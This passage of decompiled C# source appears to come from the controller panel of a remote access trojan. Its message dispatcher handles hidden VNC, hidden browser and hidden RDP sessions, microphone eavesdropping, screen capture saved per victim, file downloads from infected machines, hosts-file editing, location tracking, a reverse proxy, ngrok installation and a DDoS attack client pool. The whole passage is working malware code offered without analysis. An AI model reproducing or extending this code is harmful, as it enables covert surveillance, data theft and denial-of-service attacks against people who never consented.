							Form2 form3 = (Form2)MyProject.Application.OpenForms["Hidden VNC : " + array[1]];
							if (form3 != null)
							{
								C.method_3();
							}
							else if (form3 == null)
							{
								form3 = new Form2();
								form3.gclass5_0 = C;
								form3.Name = "Hidden VNC : " + array[1];
								form3.Text = "Hidden VNC : " + array[1];
								form3.int_0 = Convert.ToInt32(array[2]);
								form3.int_1 = Convert.ToInt32(array[3]);
								form3.Show();
							}
							break;
						}
					case "HBrowser+":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							HBrowser hBrowser3 = (HBrowser)MyProject.Application.OpenForms["Hidden Browser : " + array[1]];
							if (hBrowser3 == null)
							{
								break;
							}
							string text14 = array[2];
							if (text14.Length > 0)
							{
								Bitmap bitmap2 = (Bitmap)Image.FromStream(new MemoryStream(Module0.smethod_8(Convert.FromBase64String(text14))));
								hBrowser3.PictureBox1.Image = bitmap2;
								hBrowser3.size_0 = bitmap2.Size;
								hBrowser3.int_0++;
								if (hBrowser3.stopwatch_0.ElapsedMilliseconds >= 1000L)
								{
									hBrowser3.Text = "Hidden Browser : " + array[1] + "  FPS:" + hBrowser3.int_0 + "  Size:" + Module0.smethod_11(b.LongLength);
									hBrowser3.int_0 = 0;
									hBrowser3.stopwatch_0 = Stopwatch.StartNew();
								}
							}
							if (Operators.CompareString(hBrowser3.Guna2GradientButton1.Text, "Capturing...", TextCompare: false) == 0)
							{
								byte[] state4 = Module0.smethod_6("HBrowser+" + GClass19.string_0 + hBrowser3.Guna2ComboBox1.Text.Replace("%", "").ToString());
								_Closure_0024__R5_002D6 arg4 = default(_Closure_0024__R5_002D6);
								_Closure_0024__R5_002D6 CS_0024_003C_003E8__locals1 = new _Closure_0024__R5_002D6(arg4);
								CS_0024_003C_003E8__locals1._0024VB_0024NonLocal_8 = C;
								ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
								{
									CS_0024_003C_003E8__locals1._0024VB_0024NonLocal_8.method_1((byte[])a0);
								}, state4);
							}
							break;
						}
					case "NgrokMSG":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							ngrok ngrok3 = (ngrok)MyProject.Application.OpenForms["Ngrok Installer : " + array[1]];
							if (ngrok3 != null)
							{
								ngrok3.ToolStripStatusLabel1.ForeColor = Color.Green;
								ngrok3.ToolStripStatusLabel1.Text = array[2];
							}
							break;
						}
					case "viewimage":
						{
							FM fM5 = (FM)MyProject.Application.OpenForms["File Manager : " + array[1]];
							try
							{
								MemoryStream memoryStream2 = new MemoryStream(Module0.smethod_8(Convert.FromBase64String(array[2])));
								fM5.PictureBox1.Image = Image.FromStream(memoryStream2);
								memoryStream2.Dispose();
								break;
							}
							catch (Exception projectError7)
							{
								ProjectData.SetProjectError(projectError7);
								ProjectData.ClearProjectError();
								break;
							}
						}
					case "hrdpMSG":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							HRDP hRDP2 = (HRDP)MyProject.Application.OpenForms["Hidden RDP : " + array[1]];
							if (hRDP2 != null)
							{
								hRDP2.ToolStripStatusLabel1.ForeColor = Color.Green;
								hRDP2.ToolStripStatusLabel1.Text = array[2];
							}
							break;
						}
					case "PING!":
						if (main_0.InvokeRequired)
						{
							main_0.Invoke(new _Read(smethod_0), C, b);
							break;
						}
						lock (GClass19.gclass5s_0)
						{
							try
							{
								byte[] state3 = Module0.smethod_6("pong");
								_Closure_0024__R5_002D7 arg3 = default(_Closure_0024__R5_002D7);
								_Closure_0024__R5_002D7 CS_0024_003C_003E8__locals2 = new _Closure_0024__R5_002D7(arg3);
								CS_0024_003C_003E8__locals2._0024VB_0024NonLocal_9 = C;
								ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
								{
									CS_0024_003C_003E8__locals2._0024VB_0024NonLocal_9.method_1((byte[])a0);
								}, state3);
								if (C.listViewItem_0 != null)
								{
									C.listViewItem_0.SubItems[main_0._ActiveWindow.Index].Text = array[1].ToString();
									C.listViewItem_0.SubItems[main_0._idle.Index].Text = Module0.smethod_15(Convert.ToInt32(array[2].ToString()));
								}
								else
								{
									Debug.WriteLine("Temp socket pinged server");
								}
								break;
							}
							catch (Exception ex9)
							{
								ProjectData.SetProjectError(ex9);
								Exception ex10 = ex9;
								Debug.WriteLine("PING!: " + ex10.Message);
								ProjectData.ClearProjectError();
								break;
							}
						}
					case "HvncMSG":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Form2 form = (Form2)MyProject.Application.OpenForms["Hidden VNC : " + array[1]];
							if (form != null)
							{
								form.ToolStripStatusLabel1.Text = array[2];
							}
							break;
						}
					case "MICGET":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							MIC mIC = (MIC)MyProject.Application.OpenForms["MIC : " + array[3]];
							if (mIC == null)
							{
								break;
							}
							mIC.ToolStripStatusLabel1.Text = "Size :  [" + Module0.smethod_11(b.LongLength) + "]";
							try
							{
								mIC.bufferedWaveProvider_0.AddSamples(Module0.smethod_8(Convert.FromBase64String(array[1])), 0, Convert.ToInt32(array[2]));
								GC.Collect();
								break;
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
								break;
							}
						}
					case "RevProxy":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Proxy proxy = (Proxy)MyProject.Application.OpenForms["ReverseProxy"];
							if (proxy != null)
							{
								C.method_3();
							}
							else if (proxy == null)
							{
								proxy = new Proxy();
								proxy.gclass5_0 = C;
								proxy.Name = "ReverseProxy";
								proxy.Text = "ReverseProxy";
								proxy.string_0 = C.string_0.ToString().Split(':')[0];
								proxy.PictureBox1.Image = MyProject.Forms.Main.ii.Images[gclass0_0.method_5(C.string_0.Split(':')[0]) + ".png"];
								proxy.Label1.Text = gclass0_0.method_7(C.string_0.Split(':')[0]);
								proxy.Show();
							}
							break;
						}
					case "FilesSearcherMSG":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							FilesSearcher filesSearcher = (FilesSearcher)MyProject.Application.OpenForms["Files Searcher : " + array[1]];
							if (filesSearcher != null)
							{
								filesSearcher.ToolStripStatusLabel1.ForeColor = Color.Green;
								filesSearcher.ToolStripStatusLabel1.Text = array[2];
							}
							break;
						}
					case "PaSTIME":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Fun fun = (Fun)MyProject.Application.OpenForms["Pastime : " + array[1]];
							if (fun != null)
							{
								C.method_3();
							}
							else if (fun == null)
							{
								fun = new Fun();
								fun.gclass5_0 = C;
								fun.Name = "Pastime : " + array[1];
								fun.Text = "Pastime : " + array[1];
								fun.Show();
							}
							break;
						}
					case "RD+":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							RemoteDesktop remoteDesktop2 = (RemoteDesktop)MyProject.Application.OpenForms["Monitor : " + array[4]];
							if (remoteDesktop2 == null)
							{
								break;
							}
							Image image6 = Image.FromStream(new MemoryStream(Module0.smethod_8(Convert.FromBase64String(array[1]))));
							remoteDesktop2.size_0 = new Size(Conversions.ToInteger(array[2]), Conversions.ToInteger(array[3]));
							remoteDesktop2.PictureBox1.Image = image6;
							remoteDesktop2.int_0++;
							if (remoteDesktop2.stopwatch_0.ElapsedMilliseconds >= 1000L)
							{
								remoteDesktop2.Text = "Monitor : " + array[4] + "  FPS:" + remoteDesktop2.int_0 + "  Size:" + Module0.smethod_11(b.LongLength);
								remoteDesktop2.int_0 = 0;
								remoteDesktop2.stopwatch_0 = Stopwatch.StartNew();
							}
							if (remoteDesktop2.ToolStripStatusLabel4.ForeColor == Color.Green && b.LongLength > 2048L)
							{
								try
								{
									string text22 = Path.Combine(Application.StartupPath, "ClientsFolder", array[4], "Monitor");
									image6.Save(text22 + "\\" + DateAndTime.Now.ToString("MM-dd-yyyy HH;mm;ss;fff") + ".jpg", ImageFormat.Jpeg);
								}
								catch (Exception projectError10)
								{
									ProjectData.SetProjectError(projectError10);
									remoteDesktop2.ToolStripStatusLabel4.ForeColor = Color.Black;
									ProjectData.ClearProjectError();
								}
							}
							if (Operators.CompareString(remoteDesktop2.Guna2GradientButton1.Text, "Capturing...", TextCompare: false) != 0)
							{
								break;
							}
							if (remoteDesktop2.ToolStripStatusLabel5.ForeColor == Color.Green)
							{
								byte[] state7 = Module0.smethod_6("RDX" + GClass19.string_0 + remoteDesktop2.PictureBox1.Width + GClass19.string_0 + remoteDesktop2.PictureBox1.Height + GClass19.string_0 + remoteDesktop2.Guna2ComboBox1.Text.Replace("%", "").ToString());
								_Closure_0024__R5_002D0 arg7 = default(_Closure_0024__R5_002D0);
								_Closure_0024__R5_002D0 CS_0024_003C_003E8__locals3 = new _Closure_0024__R5_002D0(arg7);
								CS_0024_003C_003E8__locals3._0024VB_0024NonLocal_2 = C;
								ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
								{
									CS_0024_003C_003E8__locals3._0024VB_0024NonLocal_2.method_1((byte[])a0);
								}, state7);
								break;
							}
							if (remoteDesktop2.ToolStripStatusLabel2.ForeColor == Color.Green && !(remoteDesktop2.point_0 == default(Point)))
							{
								Point point = new Point(0, 0);
								point.X = remoteDesktop2.point_0.X;
								point.Y = remoteDesktop2.point_0.Y;
								remoteDesktop2.point_0 = default(Point);
								byte[] state8 = Module0.smethod_6("Click" + GClass19.string_0 + Conversions.ToString(point.X) + GClass19.string_0 + Conversions.ToString(point.Y) + GClass19.string_0);
								_Closure_0024__R5_002D1 arg8 = default(_Closure_0024__R5_002D1);
								_Closure_0024__R5_002D1 CS_0024_003C_003E8__locals4 = new _Closure_0024__R5_002D1(arg8);
								CS_0024_003C_003E8__locals4._0024VB_0024NonLocal_3 = C;
								ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
								{
									CS_0024_003C_003E8__locals4._0024VB_0024NonLocal_3.method_1((byte[])a0);
								}, state8);
							}
							byte[] state9 = Module0.smethod_6("RD+" + GClass19.string_0 + remoteDesktop2.PictureBox1.Width + GClass19.string_0 + remoteDesktop2.PictureBox1.Height + GClass19.string_0 + remoteDesktop2.Guna2ComboBox1.Text.Replace("%", "").ToString() + GClass19.string_0 + remoteDesktop2.Guna2ComboBox2.SelectedIndex);
							_Closure_0024__R5_002D2 arg9 = default(_Closure_0024__R5_002D2);
							_Closure_0024__R5_002D2 CS_0024_003C_003E8__locals5 = new _Closure_0024__R5_002D2(arg9);
							CS_0024_003C_003E8__locals5._0024VB_0024NonLocal_4 = C;
							ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
							{
								CS_0024_003C_003E8__locals5._0024VB_0024NonLocal_4.method_1((byte[])a0);
							}, state9);
							break;
						}
					case "MBoxMSG":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							MBox mBox3 = (MBox)MyProject.Application.OpenForms["MessageBox : " + array[1]];
							if (mBox3 != null)
							{
								mBox3.ToolStripStatusLabel1.ForeColor = Color.Green;
								mBox3.ToolStripStatusLabel1.Text = array[2];
							}
							break;
						}
					case "Hosts":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Hosts hosts3 = (Hosts)MyProject.Application.OpenForms["Edit Hosts : " + array[1]];
							if (hosts3 == null)
							{
								hosts3 = new Hosts();
								hosts3.gclass5_0 = C;
								hosts3.Name = "Edit Hosts : " + array[1];
								hosts3.Text = "Edit Hosts : " + array[1];
								hosts3.Show();
							}
							try
							{
								Hosts hosts4 = (Hosts)MyProject.Application.OpenForms["Edit Hosts : " + array[1]];
								hosts4.Guna2TextBox1.Text = array[3];
								hosts4.Guna2TextBox2.Text = array[2];
								break;
							}
							catch (Exception projectError9)
							{
								ProjectData.SetProjectError(projectError9);
								ProjectData.ClearProjectError();
								break;
							}
						}
					case "maps":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Maps maps2 = (Maps)MyProject.Application.OpenForms["Location Manager : " + array[1]];
							if (maps2 != null)
							{
								C.method_3();
							}
							else if (maps2 == null)
							{
								maps2 = new Maps();
								maps2.gclass5_0 = C;
								maps2.Name = "Location Manager : " + array[1];
								maps2.Text = "Location Manager : " + array[1];
								maps2.Show();
							}
							break;
						}
					case "WindowsActive":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							HBrowser hBrowser4 = (HBrowser)MyProject.Application.OpenForms["Hidden Browser : " + array[1]];
							if (hBrowser4 == null)
							{
								break;
							}
							hBrowser4.ListView1.Items.Clear();
							hBrowser4.ImageList1.Images.Clear();
							string[] array10 = array[2].Split(new string[1] { "-==>" }, StringSplitOptions.None);
							int num23 = array10.Length - 1;
							int num24;
							for (num24 = 0; num24 <= num23; num24++)
							{
								if (array10[num24].Length > 0)
								{
									ListViewItem listViewItem8 = new ListViewItem();
									listViewItem8.Text = new FileInfo(array10[num24]).Name;
									listViewItem8.SubItems.Add(array10[num24 + 3]);
									Image image4 = Image.FromStream(new MemoryStream(Convert.FromBase64String(array10[num24 + 2])));
									hBrowser4.ImageList1.Images.Add(array10[num24 + 1], image4);
									listViewItem8.ImageKey = array10[num24 + 1];
									listViewItem8.ToolTipText = array10[num24];
									hBrowser4.ListView1.Items.Add(listViewItem8);
								}
								num24 += 3;
							}
							hBrowser4.ToolStripStatusLabel1.Text = "Browsers [" + hBrowser4.ListView1.Items.Count + "]";
							hBrowser4.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
							break;
						}
					case "RD-":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							RemoteDesktop remoteDesktop = (RemoteDesktop)MyProject.Application.OpenForms["Monitor : " + array[4]];
							if (remoteDesktop != null)
							{
								C.method_3();
							}
							else
							{
								if (remoteDesktop != null)
								{
									break;
								}
								remoteDesktop = new RemoteDesktop();
								remoteDesktop.gclass5_0 = C;
								remoteDesktop.string_0 = array[4];
								remoteDesktop.Name = "Monitor : " + array[4];
								remoteDesktop.Text = "Monitor : " + array[4];
								remoteDesktop.size_0 = new Size(Conversions.ToInteger(array[2]), Conversions.ToInteger(array[3]));
								double num19 = 0.0;
								double num20 = Conversions.ToDouble(array[1]) - 1.0;
								while (true)
								{
									double num21 = num19;
									double num22 = num20;
									if (num21 > num22)
									{
										break;
									}
									remoteDesktop.Guna2ComboBox2.Items.Add("Device : " + Conversions.ToString(num19));
									num19 += 1.0;
								}
								remoteDesktop.Guna2ComboBox1.SelectedIndex = 2;
								remoteDesktop.Guna2ComboBox2.SelectedIndex = 0;
								remoteDesktop.Show();
							}
							break;
						}
					case "TCPConnection":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							TcpConnectionForm tcpConnectionForm = (TcpConnectionForm)MyProject.Application.OpenForms["TCP Connections : " + array[1]];
							if (tcpConnectionForm != null)
							{
								C.method_3();
							}
							else if (tcpConnectionForm == null)
							{
								tcpConnectionForm = new TcpConnectionForm();
								tcpConnectionForm.gclass5_0 = C;
								tcpConnectionForm.Name = "TCP Connections : " + array[1];
								tcpConnectionForm.Text = "TCP Connections : " + array[1];
								tcpConnectionForm.Show();
							}
							break;
						}
					case "ClibHVNC":
						if (main_0.InvokeRequired)
						{
							main_0.Invoke(new _Read(smethod_0), C, b);
						}
						else
						{
							System.Windows.Forms.Clipboard.SetText(array[1]);
						}
						break;
					case "HostsErr":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Hosts hosts2 = (Hosts)MyProject.Application.OpenForms["Edit Hosts : " + array[1]];
							if (hosts2 != null)
							{
								hosts2.ToolStripStatusLabel1.ForeColor = Color.Red;
								hosts2.ToolStripStatusLabel1.Text = array[2];
								hosts2.ToolStripMenuItem1.Enabled = true;
							}
							break;
						}
					case "HVNC":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Form2 form2 = (Form2)MyProject.Application.OpenForms["Hidden VNC : " + array[1]];
							if (form2 == null)
							{
								break;
							}
							Image image3 = Image.FromStream(new MemoryStream(Module0.smethod_8(Convert.FromBase64String(array[2]))));
							form2.PictureBox1.Image = image3;
							form2.int_4++;
							if (form2.stopwatch_0.ElapsedMilliseconds >= 1000L)
							{
								form2.Text = "Hidden VNC : " + array[1] + "  FPS:" + form2.int_4 + "  Size:" + Module0.smethod_11(b.LongLength);
								form2.int_4 = 0;
								form2.stopwatch_0 = Stopwatch.StartNew();
							}
							if (Operators.CompareString(form2.Guna2GradientButton1.Text, "Capturing...", TextCompare: false) == 0)
							{
								byte[] state2 = Module0.smethod_6("Cap" + GClass19.string_0 + form2.Guna2ComboBox1.Text.Replace("%", "").ToString() + GClass19.string_0 + Conversions.ToString(Convert.ToDouble(form2.Guna2ComboBox3.Text.Replace("%", "").ToString()) / 100.0));
								_Closure_0024__R5_002D4 arg2 = default(_Closure_0024__R5_002D4);
								_Closure_0024__R5_002D4 CS_0024_003C_003E8__locals6 = new _Closure_0024__R5_002D4(arg2);
								CS_0024_003C_003E8__locals6._0024VB_0024NonLocal_6 = C;
								ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
								{
									CS_0024_003C_003E8__locals6._0024VB_0024NonLocal_6.method_1((byte[])a0);
								}, state2);
							}
							break;
						}
					case "DDos":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							DDosAttack dDosAttack = (DDosAttack)MyProject.Application.OpenForms["DDosAttack"];
							if (dDosAttack != null && !DDosAttack.gclass5s_0.Contains(C))
							{
								DDosAttack.gclass5s_0.Add(C);
								dDosAttack.ToolStripStatusLabel2.Text = "Clients [" + Conversions.ToString(DDosAttack.gclass5s_0.Count) + "]";
							}
							break;
						}
					case "HBrowserMSG":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							HBrowser hBrowser2 = (HBrowser)MyProject.Application.OpenForms["Hidden Browser : " + array[1]];
							if (hBrowser2 != null)
							{
								hBrowser2.ToolStripStatusLabel2.Text = array[2];
							}
							break;
						}
					case "Programs":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Programs programs2 = (Programs)MyProject.Application.OpenForms["Installed Programs : " + array[1]];
							if (programs2 != null)
							{
								C.method_3();
							}
							else if (programs2 == null)
							{
								programs2 = new Programs();
								programs2.gclass5_0 = C;
								programs2.Name = "Installed Programs : " + array[1];
								programs2.Text = "Installed Programs : " + array[1];
								programs2.Show();
							}
							break;
						}
					case "GetPerformance":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Performance performance = (Performance)MyProject.Application.OpenForms["Performance : " + array[1]];
							if (performance != null)
							{
								performance.Guna2CircleProgressBar1.Value = Conversions.ToInteger(array[2]);
								performance.Guna2CircleProgressBar2.Value = Conversions.ToInteger(array[3]);
								performance.Label13.Text = array[4] + " Minutes";
							}
							break;
						}
					case "Wchat":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Chat chat2 = (Chat)MyProject.Application.OpenForms["Chat : " + array[1]];
							if (chat2 == null)
							{
								break;
							}
							chat2.Guna2TextBox2.Text += array[2];
							chat2.Guna2TextBox2.SelectionStart = chat2.Guna2TextBox2.Text.Length;
							chat2.Guna2TextBox2.ScrollToCaret();
							chat2.Guna2TextBox2.Refresh();
							try
							{
								MyProject.Computer.Audio.Play(Path.Combine(Application.StartupPath, "Sounds", "Chat.wav"));
								break;
							}
							catch (Exception ex)
							{
								ProjectData.SetProjectError(ex);
								Exception ex2 = ex;
								Debug.WriteLine("Wchat: " + ex2.Message);
								ProjectData.ClearProjectError();
								break;
							}
						}
					case "InformationsErr":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							INFO iNFO2 = (INFO)MyProject.Application.OpenForms["Information : " + array[1]];
							if (iNFO2 != null)
							{
								iNFO2.ToolStripStatusLabel1.ForeColor = Color.Red;
								iNFO2.ToolStripStatusLabel1.Text = array[2];
							}
							break;
						}
					case "downloadedfile":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							FM fM2 = (FM)MyProject.Application.OpenForms["File Manager : " + array[1]];
							if (fM2 == null)
							{
								break;
							}
							string text2 = Path.Combine(Application.StartupPath, "ClientsFolder", array[1]);
							if (array[3].Contains("\\") | array[3].Contains("/") | array[1].Contains("\\") | array[1].Contains("/"))
							{
								fM2.ToolStripStatusLabel1.ForeColor = Color.Red;
								fM2.ToolStripStatusLabel1.Visible = true;
								fM2.ToolStripStatusLabel1.Text = Path.GetFileName(array[3]) + " Download Blocked!";
								break;
							}
							if (!Directory.Exists(text2))
							{
								Directory.CreateDirectory(text2);
							}
							fM2.ToolStripStatusLabel1.ForeColor = Color.Green;
							fM2.ToolStripStatusLabel1.Visible = true;
							File.WriteAllBytes(text2 + "\\" + array[3], Module0.smethod_8(Convert.FromBase64String(array[2])));
							fM2.ToolStripStatusLabel1.Text = array[3] + " Download Completed";
							break;
						}
					case "Error":
						if (main_0.InvokeRequired)
						{
							main_0.Invoke(new _Read(smethod_0), C, b);
						}
						else
						{
							Module0.smethod_3(C.string_0.Split(':')[0] + " " + array[1], Color.Red);
							GClass19.int_1++;
						}
						break;
					case "Compiler":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							VBCode vBCode = (VBCode)MyProject.Application.OpenForms["VB.Net Compiler : " + array[1]];
							if (vBCode != null)
							{
								C.method_3();
							}
							else if (vBCode == null)
							{
								vBCode = new VBCode();
								vBCode.gclass5_0 = C;
								vBCode.Name = "VB.Net Compiler : " + array[1];
								vBCode.Text = "VB.Net Compiler : " + array[1];
								vBCode.Show();
							}
							break;
						}
				}
			}
			catch (Exception ex13)
			{
				ProjectData.SetProjectError(ex13);
				Module0.smethod_3(ex13.Message, Color.Red);
				GClass19.int_1++;
				ProjectData.ClearProjectError();
			}
		}
	}
}